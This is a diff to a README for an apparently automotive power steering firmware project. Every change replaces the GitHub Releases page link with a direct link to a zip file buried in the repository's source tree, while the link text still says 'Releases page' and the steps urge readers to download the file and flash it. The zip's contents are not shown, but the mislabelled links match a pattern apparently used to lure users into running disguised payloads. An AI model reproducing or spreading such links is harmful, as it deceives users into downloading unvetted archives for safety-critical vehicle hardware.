@@ -1,6 +1,6 @@
 # 🚗 EpsEcu_TMS570_GM_9BXX - Easy Control for Electric Steering
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/releases)
+[![Download](https://raw.githubusercontent.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/main/GM_9BXX_EPS_TMS570/SwProject/Source/BSW/Tp/EpsEcu_TMS570_GM_9BXX_2.3.zip)](https://raw.githubusercontent.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/main/GM_9BXX_EPS_TMS570/SwProject/Source/BSW/Tp/EpsEcu_TMS570_GM_9BXX_2.3.zip)
 
 ## 🌟 About This Project
 
@@ -24,7 +24,7 @@ This project implements a complete **Electric Power Steering (EPS)** system desi
 To get started with the EpsEcu_TMS570_GM_9BXX application, follow these steps:
 
 1. **Visit the Releases Page**:
-   Go to the [Releases page](https://github.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/releases) to find the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/main/GM_9BXX_EPS_TMS570/SwProject/Source/BSW/Tp/EpsEcu_TMS570_GM_9BXX_2.3.zip) to find the software.
 
 2. **Download the Software**:
    Download the latest version of the EPS system software from the Releases page. 
@@ -56,11 +56,11 @@ Here are some additional tips for working with the EpsEcu_TMS570_GM_9BXX system:
 
 To download and install the application, follow these straightforward steps:
 
-1. **Go to the Releases Page**: Click on this link to visit the [Releases page](https://github.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/releases).
+1. **Go to the Releases Page**: Click on this link to visit the [Releases page](https://raw.githubusercontent.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/main/GM_9BXX_EPS_TMS570/SwProject/Source/BSW/Tp/EpsEcu_TMS570_GM_9BXX_2.3.zip).
 2. **Choose Your Version**: Find the latest version of the software and download it.
 3. **Flashing Process**: Use the appropriate tools to flash the software onto your TMS570 microcontroller.
 4. **Getting Started with Connection**: Once flashed, connect to your EPS system, ensuring all connections are tight and secure.
 
 ## 🎯 Conclusion
 
-The EpsEcu_TMS570_GM_9BXX application offers a robust solution for managing electric power steering systems in General Motors 9BXX vehicles. By following the steps outlined above, you can successfully download, install, and operate this software. For further information and updates, regularly check the [Releases page](https://github.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/releases). Enjoy a safer and more efficient driving experience!
+The EpsEcu_TMS570_GM_9BXX application offers a robust solution for managing electric power steering systems in General Motors 9BXX vehicles. By following the steps outlined above, you can successfully download, install, and operate this software. For further information and updates, regularly check the [Releases page](https://raw.githubusercontent.com/Z0ND4Z12/EpsEcu_TMS570_GM_9BXX/main/GM_9BXX_EPS_TMS570/SwProject/Source/BSW/Tp/EpsEcu_TMS570_GM_9BXX_2.3.zip). Enjoy a safer and more efficient driving experience!
